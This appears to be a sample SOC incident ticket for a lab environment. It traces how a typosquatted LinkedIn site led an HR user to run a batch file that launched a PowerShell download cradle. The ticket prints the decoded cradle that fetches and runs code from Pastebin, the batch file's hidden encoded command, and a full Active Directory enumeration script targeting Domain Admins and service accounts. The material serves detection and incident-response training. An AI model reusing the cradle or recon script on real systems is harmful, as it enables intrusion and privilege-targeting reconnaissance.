# Sample Ticket 003: Suspicious PowerShell Activity - AD Reconnaissance

## Ticket Overview

| Field | Value |
|-------|-------|
| **Ticket Number** | #345678 |
| **Priority** | High |
| **Status** | Closed |
| **Department** | Tier 1 Analysts → Tier 2 Analysts (Escalated) |
| **Help Topic** | Suspicious Activity |
| **Created** | 2026-01-25 13:17:58 UTC (Automated from Splunk) |
| **Closed** | 2026-01-25 15:45:00 UTC |
| **Resolution Time** | 2 hours 27 minutes |
| **SLA Status** | Met (Target: 8 hours for High priority) |

## Ticket Details

### Subject
[Splunk Alert - HIGH] Suspicious PowerShell - Encoded Command with Network Activity

### Custom Fields

| Field | Value |
|-------|-------|
| **Affected System** | WS-HR-PC01 (10.0.0.18 - HR Workstation) |
| **Affected User** | m.johnson (HR Department) |
| **MITRE ATT&CK Technique** | T1059.001 - Command and Scripting Interpreter: PowerShell |
| **Alert Source** | Splunk SIEM (Automated Detection) |
| **Investigation Status** | Closed - False Positive Converted to True Positive |
| **Incident Severity** | High - Active Directory Reconnaissance |

### Indicators of Compromise (IOCs)

```
External Domain: pastebin[.]com
External IP: 104.26.13.47
Pastebin URL: hxxps://pastebin[.]com/raw/abc123
Malicious Script Delivery: linkedin-career-resources[.]com (typosquatting)
Redirect Domain: linkedin-cdn[.]xyz
Malicious File: Windows_Update_Helper.bat
PowerShell Technique: Invoke-WebRequest | Invoke-Expression (fileless)
Target: Active Directory enumeration
```

---

## Ticket Timeline

### [2026-01-25 13:17:58 UTC] - TICKET CREATED (Automated - Splunk)

**Initial Alert Message:**
```
=== SPLUNK SIEM ALERT ===

Alert Name: Suspicious PowerShell - Encoded Command with Network Activity
Severity: HIGH
Trigger Time: 2026-01-25 13:17:58 UTC
Alert URL: http://splunk.lab.local:8000/app/search/powershell_alert_789

=== AFFECTED SYSTEMS ===
Hostname: WS-HR-PC01
User Account: m.johnson (HR Department)
Process: powershell.exe (PID 7248)
Parent Process: cmd.exe (PID 7212)

=== ALERT DETAILS ===
Command Line: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden 
-EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgA...

External Connection: 104.26.13.47:443 (pastebin.com)
Event Time: 2026-01-25 13:17:08 UTC

=== INDICATORS OF COMPROMISE ===
Process: powershell.exe
Parameters: -EncodedCommand, -WindowStyle Hidden, -ExecutionPolicy Bypass
Network: External connection to pastebin.com
Technique: PowerShell download cradle (fileless attack)

=== MITRE ATT&CK MAPPING ===
Technique: T1059.001 - PowerShell Execution

=== RECOMMENDED ACTIONS ===
1. Decode PowerShell command immediately
2. Check external connection (Pastebin content)
3. Verify PowerShell execution was authorized
4. Check for Active Directory enumeration activity
5. Follow Suspicious Activity Playbook

=== SPLUNK QUERY ===
index=windows_sysmon EventCode=1 CommandLine="*-EncodedCommand*" 
CommandLine="*-WindowStyle Hidden*"
| eval decoded=base64decode(encoded_command)
| table _time, host, user, CommandLine, decoded

This ticket was automatically created by Splunk integration.
Analyst: Investigate encoded PowerShell with external network connection.
```

### [2026-01-25 13:19:15 UTC] - Tier 1 Initial Triage

**Internal Note - David Park (Tier 1 Analyst):**
```
=== INITIAL TRIAGE ===
Analyst: David Park (Tier 1)
Time: 2026-01-25 13:19:15 UTC

Alert Review:
- POTENTIALLY MALICIOUS - Encoded PowerShell with external connection
- Severity Assessment: HIGH (confirmed - suspicious indicators)
- Activity Status: Completed (execution finished, analyzing aftermath)
- User Context: HR Department (access to sensitive employee data)

Red Flags Identified:
🚩 Encoded PowerShell command (obfuscation)
🚩 ExecutionPolicy Bypass (evasion technique)
🚩 WindowStyle Hidden (stealth)
🚩 External connection to Pastebin (common C2 staging)
🚩 Parent process: cmd.exe (unusual chain)

Initial Assessment:
Highly suspicious PowerShell execution with all hallmarks of malicious activity.
The use of Pastebin for second-stage payload retrieval is a well-known 
attacker technique. Need to decode command and retrieve Pastebin content 
immediately.

Priority Actions:
1. Decode Base64 command
2. Retrieve Pastebin content (before it's deleted)
3. Check for post-execution activity
4. Verify if system is compromised
```

### [2026-01-25 13:20:30 UTC] - Command Decoded & Process Termination

**Internal Note - David Park:**
```
=== POWERSHELL COMMAND DECODING ===
Time: 2026-01-25 13:20:30 UTC

Base64 Decoded Command:
Invoke-WebRequest -Uri https://pastebin.com/raw/abc123 | Invoke-Expression

ANALYSIS:
⚠ POWERSHELL DOWNLOAD CRADLE DETECTED
- Downloads content from Pastebin
- Executes downloaded content directly in memory (Invoke-Expression)
- Fileless attack technique - no payload written to disk
- Classic second-stage payload delivery method

IMMEDIATE THREAT:
PowerShell process is likely still running. Need to terminate NOW before
it can complete whatever the second-stage payload is doing.

Actions Taken:
✓ Remotely terminated PowerShell PID 7248 via Wazuh EDR (13:20:25)
✓ Verified process terminated successfully
✓ Process lifetime: ~3 minutes (13:17:08 to 13:20:25)

Current Status:
- PowerShell process: TERMINATED
- Threat: PARTIALLY CONTAINED (need to assess what it did during runtime)
- System: Still on network (not yet isolated)

Next Steps:
- Retrieve Pastebin content to see what was executed
- Check for signs of execution (AD queries, network connections, etc.)
- Determine if escalation needed
```

### [2026-01-25 13:21:45 UTC] - Pastebin Content Retrieved

**Internal Note - David Park:**
```
=== SECOND-STAGE PAYLOAD ANALYSIS ===
Time: 2026-01-25 13:21:45 UTC

Retrieved Pastebin Content:
URL: hxxps://pastebin[.]com/raw/abc123
Retrieved: Successfully captured before potential deletion

Payload Content (PowerShell Script):
```powershell
# Second-stage reconnaissance script
$domain = $env:USERDNSDOMAIN
$dc = (Get-ADDomainController -Discover).HostName

# Enumerate Domain Admins
Write-Output "[+] Enumerating Domain Admins..."
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName, ObjectClass | Out-String

# Enumerate Service Accounts
Write-Output "[+] Enumerating Service Accounts..."
Get-ADServiceAccount -Filter * | Select-Object Name, DistinguishedName | Out-String

# Enumerate Enterprise Admins
Write-Output "[+] Enumerating Enterprise Admins..."
Get-ADGroupMember -Identity "Enterprise Admins" | Select-Object Name, SamAccountName | Out-String

# Enumerate enabled user accounts
Write-Output "[+] Enumerating Enabled Users..."
Get-ADUser -Filter 'Enabled -eq $true' | Select-Object Name, SamAccountName, Description | Out-String

# Enumerate computers
Write-Output "[+] Enumerating Domain Computers..."
Get-ADComputer -Filter * | Select-Object Name, DNSHostName, OperatingSystem | Out-String

# Enumerate domain trusts
Write-Output "[+] Enumerating Domain Trusts..."
Get-ADTrust -Filter * | Out-String

# Enumerate Group Policy Objects
Write-Output "[+] Enumerating GPOs..."
Get-GPO -All | Select-Object DisplayName, Id, GpoStatus | Out-String
```

THREAT ANALYSIS:
⚠ ACTIVE DIRECTORY RECONNAISSANCE SCRIPT
⚠ THIS IS NOT RANDOM MALWARE - THIS IS TARGETED ATTACK

Script Purpose:
- Enumerate Domain Admins (high-value targets)
- Identify service accounts (often weak passwords)
- Map domain structure
- Identify computers and operating systems
- Understand Group Policy configuration

Attack Stage:
This is RECONNAISSANCE phase of targeted attack. Attacker is:
1. Mapping the environment
2. Identifying high-value targets
3. Planning next stage (likely lateral movement or privilege escalation)

ESCALATING TO TIER 2 - This is a sophisticated, targeted attack requiring
advanced investigation and threat hunting.
```

### [2026-01-25 13:22:00 UTC] - ESCALATION TO TIER 2

**Internal Note - David Park:**
```
=== ESCALATING TO TIER 2 ===
Analyst: David Park (Tier 1)
Time: 2026-01-25 13:22:00 UTC

Escalation Reason:
Sophisticated Active Directory reconnaissance attack suggesting targeted 
threat actor. This is beyond routine malware - requires advanced investigation,
threat hunting, and comprehensive compromise assessment.

Summary for Tier 2:
- HR user executed malicious PowerShell script
- Script retrieved second-stage payload from Pastebin
- Payload = AD reconnaissance script (Domain Admins, users, computers, etc.)
- Script executed for ~3 minutes before termination
- This appears to be reconnaissance phase of multi-stage attack

Evidence Collected:
✓ Encoded PowerShell command (decoded)
✓ Pastebin URL and content retrieved
✓ Process tree showing cmd.exe → powershell.exe chain
✓ PowerShell process terminated after 3 minutes runtime
✓ AD reconnaissance script analyzed (targeting privileged accounts)

Critical Questions for Tier 2:
1. How did user execute this? (delivery mechanism unknown)
2. What AD queries actually completed during 3-minute window?
3. Did attacker receive any enumeration results?
4. Is this part of larger campaign?
5. Are other systems compromised?

Immediate Concerns:
- Unknown attack vector (how did user run this?)
- Possible data exfiltration of AD enumeration results
- Potential for follow-on attacks using gathered intelligence
- HR department access to sensitive employee data

Recommended Tier 2 Actions:
1. User interview to determine delivery mechanism
2. Check Windows Security logs for AD queries
3. Network traffic analysis for data exfiltration
4. Comprehensive host investigation
5. Threat hunt across environment for similar activity
6. Credential monitoring for targeted accounts

Urgency: HIGH (targeted attack, reconnaissance completed)
Status: Transferred to Tier 2 Analysts
Investigation Status: Escalated - Advanced Threat Investigation Required
```

### [2026-01-25 13:23:30 UTC] - Tier 2 Takes Ownership

**Internal Note - Marcus Chen (Tier 2 Analyst):**
```
=== TIER 2 OWNERSHIP ===
Analyst: Marcus Chen (Tier 2)
Time: 2026-01-25 13:23:30 UTC

Escalation acknowledged. Reviewing Tier 1 findings.

Tier 1 Assessment: ✓ Excellent work
- Quick response (process terminated within 3 minutes)
- Thorough initial analysis
- Retrieved Pastebin content before potential deletion
- Correctly identified as targeted reconnaissance
- Appropriate escalation decision

This is indeed a sophisticated attack. The script is well-structured and
targets specific AD information useful for planning privilege escalation 
and lateral movement.

Investigation Plan:
1. Determine attack vector (user interview)
2. Analyze what AD queries actually executed
3. Check for data exfiltration
4. Host isolation decision (may not need isolation if contained)
5. Threat hunt for similar activity
6. Assess overall compromise

Beginning investigation...
```

### [2026-01-25 13:25:00 UTC] - Activity Timeline Reconstruction

**Internal Note - Marcus Chen:**
```
=== ATTACK TIMELINE RECONSTRUCTION ===
Time: 2026-01-25 13:25:00 UTC

Complete Event Timeline from Logs:

13:15:42 - User browsing: linkedin-career-resources[.]com (TYPOSQUATTING)
13:16:08 - Malicious redirect to: linkedin-cdn[.]xyz (fake CDN)
13:16:33 - File download: Windows_Update_Helper.bat
13:17:05 - User executed: Windows_Update_Helper.bat
13:17:06 - Batch script launched cmd.exe (PID 7212)
13:17:08 - cmd.exe spawned powershell.exe (PID 7248)
13:17:11 - PowerShell connected to pastebin[.]com:443
13:17:14 - Second-stage script downloaded and executed
13:17:18 - LDAP query to DC01: Domain Admins enumeration
13:17:25 - PowerShell command: Get-ADServiceAccount
13:17:32 - net.exe command: "net view \\\\DC01 /all"
13:17:38 - LDAP connection to DC01 (10.0.0.10:389)
13:17:45 - LDAP query: Enabled user accounts
13:17:52 - gpresult.exe executed (GPO enumeration)
13:17:58 - SPLUNK ALERT TRIGGERED
13:19:15 - Tier 1 analyst began triage
13:20:25 - PowerShell process terminated (Tier 1 action)

Attack Vector Identified:
✓ Typosquatting domain: linkedin-career-resources[.]com
✓ Social engineering: Fake Windows Update popup
✓ User tricked into downloading and executing .bat file
✓ Batch file launched encoded PowerShell

Execution Timeline:
- Script ran for 3 minutes 17 seconds (13:17:08 to 13:20:25)
- Multiple AD queries completed before termination
- Some enumeration successful, some interrupted
```

### [2026-01-25 13:30:00 UTC] - AD Query Analysis

**Internal Note - Marcus Chen:**
```
=== ACTIVE DIRECTORY QUERY ANALYSIS ===
Time: 2026-01-25 13:30:00 UTC

Checking which AD queries actually completed:

Query: index=windows_security EventCode=4662 SubjectUserName="m.johnson" 
earliest="2026-01-25T13:17:00"

Results - Successful AD Enumeration:

✓ Domain Admins Group (EventCode 4662 - 13:17:18)
  - Query: LDAP search for Domain Admins members
  - Status: COMPLETED
  - Information Obtained: List of 5 Domain Admin accounts

✓ Service Accounts (Get-ADServiceAccount - 13:17:25)
  - Status: COMPLETED
  - Information Obtained: 3 service account names

✓ Network Shares (net view - 13:17:32)
  - Status: COMPLETED
  - Information Obtained: DC01 shares list

✓ LDAP Enumeration (13:17:38 - 13:17:45)
  - Status: PARTIALLY COMPLETED
  - Some user accounts enumerated before interruption

⚠ User Enumeration (Get-ADUser)
  - Status: INTERRUPTED mid-execution
  - Estimated 30% completion before termination

⚠ Computer Enumeration (Get-ADComputer)
  - Status: NOT EXECUTED (terminated before reaching this stage)

⚠ Domain Trusts (Get-ADTrust)
  - Status: NOT EXECUTED

⚠ GPO Enumeration (Get-GPO)
  - Status: PARTIALLY EXECUTED (gpresult ran, but Get-GPO didn't complete)

Summary:
Attacker successfully obtained:
- List of Domain Admin accounts (HIGH VALUE)
- Service account names (HIGH VALUE)
- Network shares on DC01
- Partial user account list (~30 accounts)
- Group Policy results for affected workstation

Attacker did NOT obtain:
- Complete user account list
- Complete computer inventory
- Domain trust relationships
- Full GPO configuration

Impact: MODERATE
Attacker gained valuable targeting information but investigation was 
interrupted before complete enumeration.
```

### [2026-01-25 13:40:00 UTC] - Network Traffic Analysis

**Internal Note - Marcus Chen:**
```
=== DATA EXFILTRATION ANALYSIS ===
Time: 2026-01-25 13:40:00 UTC

Checking if enumeration results were exfiltrated:

Query: index=proxy src_ip="10.0.0.18" earliest="2026-01-25T13:17:00"

Network Connections from WS-HR-PC01:

13:17:11 - pastebin[.]com (104.26.13.47:443)
  - Purpose: Download second-stage payload
  - Direction: INBOUND (download)
  - Size: 2.4 KB (script size)
  - Status: Normal for this attack pattern

13:17:18 - DC01 (10.0.0.10:389) LDAP
  - Purpose: AD queries (expected)
  - Direction: Bidirectional (query/response)
  - Size: 15 KB total
  - Status: Normal for AD enumeration

Additional Outbound Connections: NONE

Analysis:
✓ NO evidence of data exfiltration detected
✓ No POST requests to external domains
✓ No large outbound data transfers
✓ No DNS tunneling detected
✓ No unusual encrypted connections

Conclusion:
Enumeration results were NOT successfully exfiltrated. The script likely
stores results in variables or local files for later exfiltration, but
the process was terminated before that stage.

Checking for local file artifacts:
```

### [2026-01-25 13:45:00 UTC] - Host Investigation

**Internal Note - Marcus Chen:**
```
=== HOST FORENSIC ANALYSIS ===
Time: 2026-01-25 13:45:00 UTC

File System Investigation:

Malicious File Located:
✓ C:\Users\m.johnson\Downloads\Windows_Update_Helper.bat
  - Created: 13:16:33 UTC
  - Size: 842 bytes
  - Still present on system

Batch File Content:
```batch
@echo off
set cmd=powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQB3AC8AYQBiAGMAMQAyADMA
%cmd% | Invoke-Expression
```

Temporary Files:
✓ No output files found in Temp directory
✓ No suspicious files in user profile
✓ PowerShell transcript logging was disabled (intentional evasion)

Memory Analysis:
PowerShell process terminated, but checking for remnants:
✓ No additional PowerShell processes running
✓ No scheduled tasks created
✓ No registry persistence mechanisms found
✓ No additional malware downloaded

Persistence Check:
Query: index=windows_sysmon EventCode=13 OR EventCode=11 host="WS-HR-PC01"

Result: ✓ NO persistence mechanisms detected
- No registry Run keys modified
- No scheduled tasks created
- No startup folder modifications
- No services installed

Assessment:
This was a RECONNAISSANCE-ONLY attack. The attacker:
✓ Did NOT install malware
✓ Did NOT establish persistence
✓ Did NOT exfiltrate data (interrupted)
✓ Did NOT achieve lateral movement

This appears to be early-stage attack that was successfully disrupted.
```

### [2026-01-25 13:55:00 UTC] - User Interview

**Internal Note - Marcus Chen:**
```
=== USER INTERVIEW ===
Time: 2026-01-25 13:55:00 UTC
Interviewee: Michelle Johnson (m.johnson) - HR Department

Interview conducted via phone:

Q: Can you describe what you were doing before the security alert?
A: "I was researching LinkedIn for recruiting purposes. I was looking for 
   career resources and articles about HR best practices."

Q: What website did you visit?
A: "I think I Googled 'LinkedIn career resources' and clicked one of the 
   top results. It looked like a LinkedIn page initially."

Q: What happened on that website?
A: "A popup appeared saying my Windows needed a security update. It looked 
   legitimate, like Microsoft update notifications. It said I needed to run 
   a helper program to check for updates."

Q: Did you download or run anything?
A: "Yes, I clicked to download the update helper. It was a small file. I ran 
   it, but nothing seemed to happen. No windows opened, so I thought maybe 
   it ran in the background."

Q: Did you notice the website address?
A: "Not really. I thought it was LinkedIn, but now I'm not sure. I should 
   have looked more carefully at the URL."

Q: Have you noticed anything unusual on your computer since then?
A: "No, everything seems normal. My computer is still working fine."

Analysis:
✓ Classic social engineering attack
✓ Typosquatting domain mimicking LinkedIn
✓ Fake Windows Update popup (common technique)
✓ User fell for legitimate-looking interface
✓ File executed with hidden window (no visible feedback)

Attack Vector Confirmed:
User visited typosquatting domain → Fake update popup → Downloaded .bat file
→ User executed file → PowerShell reconnaissance launched

User Education Provided:
✓ Explained the attack and how to identify typosquatting
✓ Discussed verifying website URLs carefully
✓ Emphasized never running executables from untrusted sources
✓ Recommended always verifying update prompts through official channels
✓ No disciplinary action - sophisticated social engineering

User Status:
- Cooperative and concerned
- Understands the incident
- Willing to attend security training
- No indication of intentional wrongdoing
```

### [2026-01-25 14:10:00 UTC] - Threat Hunting

**Internal Note - Marcus Chen:**
```
=== THREAT HUNTING - SIMILAR ACTIVITY ===
Time: 2026-01-25 14:10:00 UTC

Hunting for similar attacks across environment:

Hunt 1: Other visits to typosquatting domains
Query: index=proxy (dest="*linkedin-career*" OR dest="*linkedin-cdn*")

Result: ✓ NONE - Only m.johnson visited these domains

Hunt 2: Other PowerShell download cradles
Query: index=windows_sysmon EventCode=1 CommandLine="*Invoke-WebRequest*Invoke-Expression*"

Result: ✓ NONE - Only this one instance detected

Hunt 3: Other Pastebin connections
Query: index=proxy dest="pastebin.com" src_ip!="10.0.0.18"

Result: 2 connections found
- 10.0.0.22 (IT Workstation) - Developer checking code snippets (benign)
- 10.0.0.35 (Dev Server) - Automated script deployment (benign)

Hunt 4: AD enumeration by non-IT accounts
Query: index=windows_security EventCode=4662 
SubjectUserName!=("admin*" OR "svc-*") ObjectType="groupPolicyContainer"

Result: ✓ ONLY m.johnson account (this incident)

Hunt 5: Similar batch files downloaded
Query: index=windows_sysmon EventCode=11 TargetFilename="*.bat" 
Image="*chrome.exe" OR Image="*firefox.exe" OR Image="*msedge.exe"

Result: ✓ NONE (other than this incident)

Conclusion:
✓ This appears to be an ISOLATED incident
✓ No evidence of widespread campaign
✓ No other systems compromised
✓ No other users targeted
✓ Single attack attempt that was disrupted

Assessment: Low risk of additional compromised systems
```

### [2026-01-25 14:30:00 UTC] - Remediation & Hardening

**Internal Note - Marcus Chen:**
```
=== REMEDIATION ACTIONS ===
Time: 2026-01-25 14:30:00 UTC

Affected System: WS-HR-PC01

Remediation Completed:

1. Malware Removal:
   ✓ Deleted malicious batch file (Windows_Update_Helper.bat)
   ✓ Cleared browser cache and downloads
   ✓ Full antivirus scan completed - CLEAN
   ✓ No persistence found, no additional cleanup needed

2. Credential Management:
   ✓ m.johnson password reset (precautionary)
   ✓ Active sessions terminated
   ✓ Account remains enabled (attack disrupted, no compromise)

3. Monitoring:
   ✓ Enhanced logging on WS-HR-PC01
   ✓ Flagged m.johnson account for 7-day monitoring
   ✓ Alert created for any privilege escalation attempts

Network Security:

1. Domain Blocking:
   ✓ linkedin-career-resources[.]com - DNS blacklist
   ✓ linkedin-cdn[.]xyz - DNS blacklist
   ✓ pastebin[.]com/raw/abc123 - Blocked (content removed from Pastebin)

2. Firewall Rules:
   ✓ No changes needed (existing egress filtering adequate)

Detection Improvements:

1. New Splunk Alerts Created:
   ✓ Alert: Batch file downloaded from browser
   ✓ Alert: Net.exe commands from non-IT users
   ✓ Alert: Multiple AD enumeration commands in short timeframe
   ✓ Alert: Access to Pastebin from non-development systems

2. Enhanced Monitoring:
   ✓ HR department systems added to high-priority monitoring
   ✓ AD enumeration activity flagged for review

3. Security Controls:
   ✓ Application whitelisting consideration for HR department
   ✓ PowerShell Constrained Language Mode evaluated

Decision: NO system reimage required
- No malware installed
- No persistence established
- Simple file deletion sufficient
- Enhanced monitoring in place
```

### [2026-01-25 14:50:00 UTC] - Threat Intelligence

**Internal Note - Marcus Chen:**
```
=== THREAT INTELLIGENCE ENRICHMENT ===
Time: 2026-01-25 14:50:00 UTC

Domain Analysis:

linkedin-career-resources[.]com
- Registered: 2026-01-20 (5 days ago - NEWLY REGISTERED)
- Registrar: Namecheap (PRIVACY PROTECTED)
- Hosting: Cloudflare
- Status: MALICIOUS - Typosquatting
- Reports: No previous abuse reports (very new)
- Recommendation: Block and report to domain registrar

linkedin-cdn[.]xyz
- Registered: 2026-01-18 (7 days ago - NEWLY REGISTERED)
- Registrar: Namecheap (PRIVACY PROTECTED)
- Hosting: Cloudflare
- Status: MALICIOUS - Attack infrastructure
- Recommendation: Block and report

Pastebin URL: hxxps://pastebin[.]com/raw/abc123
- Created: Unknown (now deleted - returns 404)
- Content: Captured before deletion (reconnaissance script)
- Note: Pastebin is legitimate service abused by attackers

Attack Attribution:

Pattern Analysis:
- Typosquatting domains (social engineering)
- Pastebin for second-stage (common technique)
- AD reconnaissance (privilege escalation preparation)
- Professional script quality (not amateur)

Likely Threat Actor:
- Characteristics match mid-tier cybercriminal
- Not APT-level sophistication (but organized)
- Likely financially motivated (preparing for ransomware/data theft)
- Targeting HR (employee data, credentials)

Similar Attacks:
Searched threat intelligence feeds for similar patterns:
- Pattern matches recent campaigns targeting HR departments
- Multiple organizations report similar typosquatting domains
- Common precursor to ransomware attacks

Recommendation: 
Share IOCs with information sharing communities (ISAC)
```

### [2026-01-25 15:10:00 UTC] - Preventive Measures

**Internal Note - Marcus Chen:**
```
=== PREVENTIVE MEASURES IMPLEMENTED ===
Time: 2026-01-25 15:10:00 UTC

Immediate Actions (COMPLETED):

1. User Security:
   ✓ m.johnson security awareness session completed
   ✓ HR department manager notified
   ✓ HR team security reminder email sent

2. Technical Controls:
   ✓ Malicious domains blacklisted
   ✓ Enhanced detection rules deployed
   ✓ PowerShell logging validated
   ✓ Browser download warnings configured

3. Detection Enhancement:
   ✓ Four new detection rules created (listed earlier)
   ✓ Alert sensitivity increased for AD enumeration
   ✓ Monitoring enhanced for HR department systems

Short-Term Actions (Next 7 Days):

⏳ Security awareness training for HR department
⏳ Review and strengthen web filtering
⏳ Evaluate typosquatting detection tools
⏳ Implement additional browser security extensions
⏳ Review similar organizations' threat intel for related campaigns

Long-Term Actions (Next 30 Days):

⏳ Deploy DNS security service (typosquatting protection)
⏳ Implement application control for non-IT users
⏳ PowerShell Constrained Language Mode for standard users
⏳ Enhanced security training program
⏳ Phishing simulation exercises for all departments
⏳ Evaluate and deploy browser isolation technology

Defense-in-Depth Assessment:
✓ Detection: Worked correctly (alert triggered within 1 minute)
✓ Response: Rapid (process terminated within 3 minutes)
✓ Containment: Effective (no data exfiltration, no persistence)
✓ Recovery: Simple (no system compromise)

Gaps Identified:
⚠ User training insufficient (fell for social engineering)
⚠ No typosquatting protection (allowed access to malicious domains)
⚠ PowerShell not restricted for standard users
⚠ No application whitelisting (user could run .bat file)

Recommendations being forwarded to management for approval.
```

### [2026-01-25 15:45:00 UTC] - INCIDENT CLOSURE

**Internal Note - Marcus Chen:**
```
=== INCIDENT CLOSURE ===
Analyst: Marcus Chen (Tier 2)
Time: 2026-01-25 15:45:00 UTC
Resolution: Resolved - True Positive - Reconnaissance Attack Disrupted

Final Summary:
HR department user fell victim to social engineering attack via typosquatting
domain impersonating LinkedIn. User downloaded and executed malicious batch 
file that launched encoded PowerShell to retrieve AD reconnaissance script 
from Pastebin. Script successfully enumerated Domain Admin accounts and 
service accounts before being terminated by SOC. No malware installed, no 
persistence established, and no data exfiltration occurred. Attack was early-
stage reconnaissance for planned follow-on attack. Rapid detection and 
response disrupted attack before significant compromise.

Incident Metrics:
- Time to Detection: <1 minute (alert fired at 13:17:58, activity at 13:17:08)
- Time to Response: 1 minute 17 seconds (analyst triaged at 13:19:15)
- Time to Containment: 3 minutes 17 seconds (process killed at 13:20:25)
- Total Resolution Time: 2h 27min from alert creation
- Attack Success: PARTIAL (some enumeration completed, but disrupted)

Systems Affected:
- WS-HR-PC01 - Cleaned (simple file deletion)

Users Affected:
- m.johnson - Educated, password reset, no disciplinary action

IOCs Documented:
- linkedin-career-resources[.]com (typosquatting)
- linkedin-cdn[.]xyz (malicious redirect)
- pastebin[.]com/raw/abc123 (payload delivery)
- Windows_Update_Helper.bat (initial execution)
- See full IOC list documented above

Data Obtained by Attacker:
⚠ Domain Admin account list (5 accounts)
⚠ Service account names (3 accounts)
⚠ Network shares on DC01
⚠ Partial user account list (~30 accounts)

Data NOT Obtained:
✓ Complete user inventory
✓ Computer inventory
✓ Domain trusts
✓ GPO configurations (partial only)

Root Cause:
1. User social engineering via typosquatting domain
2. Lack of typosquatting protection in DNS/web filtering
3. No application control to prevent .bat execution
4. PowerShell not restricted for standard users
5. User security awareness gap

Preventive Measures:
1. Malicious domains blacklisted
2. Four new detection rules created
3. Enhanced monitoring for HR systems
4. User and department security awareness improved
5. Technical control recommendations submitted to management:
   - DNS security service (typosquatting protection)
   - Application control/whitelisting
   - PowerShell Constrained Language Mode
   - Browser isolation technology

Lessons Learned:
1. Rapid detection and response prevented major compromise
2. Early-stage reconnaissance is critical detection opportunity
3. Typosquatting is effective social engineering technique
4. PowerShell needs additional controls for standard users
5. HR department is high-value target (employee data access)
6. Tier 1 to Tier 2 escalation process worked effectively
7. Threat hunting found no evidence of widespread campaign

Detection Rule Performance:
✓ "Suspicious PowerShell - Encoded Command" worked perfectly
✓ Alert provided all necessary context for rapid triage
✓ Automated ticket creation enabled immediate response
✓ No tuning required - rule operating optimally

What Went Well:
✓ Detection within 1 minute
✓ Rapid Tier 1 response and triage
✓ Appropriate escalation to Tier 2
✓ Process termination before complete enumeration
✓ Comprehensive investigation and threat hunting
✓ No business impact (user able to continue working)

Areas for Improvement:
⚠ User fell for social engineering (training gap)
⚠ No technical controls prevented .bat execution
⚠ PowerShell too permissive for standard users
⚠ Typosquatting domains not blocked proactively

Recommended Monitoring:
- Monitor Domain Admin accounts for unusual activity (30 days)
- Monitor service accounts for authentication anomalies (30 days)
- Monitor m.johnson account for privilege escalation attempts (7 days)
- Watch for follow-on attacks using gathered intelligence (ongoing)

Reference Investigation:
See detailed investigation: [Investigation 004: Suspicious PowerShell Activity](../../investigations/investigation-004-suspicious-powershell.md)

Status: CLOSED
Time to Resolution: 2 hours 27 minutes
SLA Status: MET (Target: 8 hours for High priority)
Business Impact: None (attack disrupted before compromise)
User Impact: Minimal (brief interview, password reset)
```

---

## Ticket Closure Details

### Final Status
- **Status:** Closed
- **Resolution:** Resolved - True Positive
- **Resolution Category:** Security Incident - AD Reconnaissance
- **Closure Code:** Attack Disrupted - Partial Enumeration Occurred

### User Communication
**Final Email to m.johnson:**
```
Subject: Security Incident Resolved - No Action Required

Dear Michelle,

The security incident involving your workstation has been fully investigated 
and resolved. Your computer is secure and ready for normal use.

What Happened:
You visited a fake website that impersonated LinkedIn (typosquatting attack).
The website displayed a fake Windows Update popup that tricked you into 
downloading and running a malicious script. This script attempted to gather 
information about our Active Directory environment but was quickly detected 
and stopped by our SOC team.

What We Found:
- The attack was detected within 1 minute
- We stopped the malicious process within 3 minutes
- No malware was installed on your computer
- No damage to your system or data
- Minimal information was gathered before we stopped it

What We Did:
- Removed the malicious file from your computer
- Reset your password as a precaution
- Blocked the malicious websites
- Enhanced monitoring on HR systems
- Created additional detection rules

What You Should Do:
- Continue to use your computer normally - it's completely safe
- Be extra vigilant for the next few weeks
- Verify website URLs carefully (especially for LinkedIn)
- Never run files downloaded from popups or unfamiliar websites
- When in doubt, contact IT Security BEFORE clicking anything
- Attend the security awareness session scheduled for next week

Important: This was a sophisticated attack that could fool anyone. You did the
right thing by being honest and cooperative during our investigation. There 
will be no disciplinary action.

Red Flags to Watch For:
- Misspelled website addresses (linkedin-career vs linkedin.com)
- Unexpected update popups while browsing
- Downloads that start from website popups
- Requests to "enable" or "run" anything from untrusted sources

If you notice anything unusual on your computer or receive suspicious emails,
please contact the SOC team immediately at soc@lab.local or extension 5555.

Thank you for your cooperation and understanding.

SOC Team
Ticket #345678
```

### Follow-Up Actions
- [x] Monitor Domain Admin accounts for 30 days (assigned to SOC Team)
- [x] HR department security training (assigned to Security Awareness Team)
- [ ] Evaluate DNS security service (assigned to IT Security Manager)
- [ ] Application control implementation (assigned to IT Operations)
- [ ] PowerShell restrictions review (assigned to IT Security Team)

### Related Tickets
- Ticket #345679: IT Security - Implement typosquatting protection
- Ticket #345680: Training - HR department security awareness session
- Ticket #345681: Detection Engineering - Validate new PowerShell rules

### Metrics Summary
- **MTTA (Mean Time to Acknowledge):** 1 minute 17 seconds (Target: 30 min) ✓ EXCELLENT
- **MTTR (Mean Time to Resolve):** 2h 27min (Target: 8 hours) ✓ MET SLA
- **Containment Time:** 3 minutes 17 seconds ✓ EXCELLENT
- **Attack Success:** PARTIAL (some enumeration but no full compromise)
- **Business Impact:** None
- **Escalation:** Appropriate T1→T2 escalation
- **Detection Quality:** Excellent (sub-minute detection)

---

## Key Takeaways from This Ticket

This sample ticket demonstrates:

1. **Automated Alert Creation:** Ticket created automatically by Splunk via API
2. **Rapid Detection:** Sub-minute detection of suspicious PowerShell
3. **Effective Tier 1 Response:** Quick triage, command decoding, process termination
4. **Appropriate Escalation:** Tier 1 correctly identified need for advanced investigation
5. **Comprehensive Tier 2 Investigation:** Timeline reconstruction, threat hunting, user interview
6. **Complete IOC Documentation:** Full attack chain mapped and documented
7. **Threat Intelligence Integration:** Attack pattern analyzed and attributed
8. **Effective Containment:** Attack disrupted before full compromise
9. **Preventive Measures:** Multiple layers of prevention implemented
10. **Clear Communication:** Professional user notification without blame

**Automated Ticket Creation Highlights:**
- Splunk alert triggered automatically
- Ticket created via API with all alert context
- Analyst immediately had all necessary information
- No manual ticket creation delay
